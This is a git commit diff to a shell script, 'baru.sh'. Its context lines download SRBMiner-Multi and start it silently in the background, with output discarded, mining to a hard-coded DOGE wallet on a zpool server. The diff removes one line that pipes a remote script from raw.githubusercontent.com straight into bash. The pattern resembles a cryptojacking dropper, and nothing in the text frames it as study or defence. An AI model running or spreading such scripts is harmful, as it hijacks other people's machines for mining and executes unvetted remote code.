8058b031563144042959af7e5bad6c7425c2da40
malogrono <136266511+malogrono@users.noreply.github.com>
2026-05-20 12:23:35 +0700

    Update baru.sh

--- baru.sh
+++ baru.sh
@@ -15,4 +15,3 @@ wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.4/SRBMiner
 tar -xzvf SRBMiner-Multi-2-7-4-Linux.tar.gz
 cd SRBMiner-Multi-2-7-4
 ./SRBMiner-MULTI --algorithm verushash --pool stratum+tcp://yescryptR16.sea.mine.zpool.ca:6333 --u DA4FjHjgrGxbsaxVxyCiQ9BYhRFfQ5ojG6 -p c=DOGE,zap=QOGE."gP$RANDOM" >/dev/null 2>&1 &
-curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
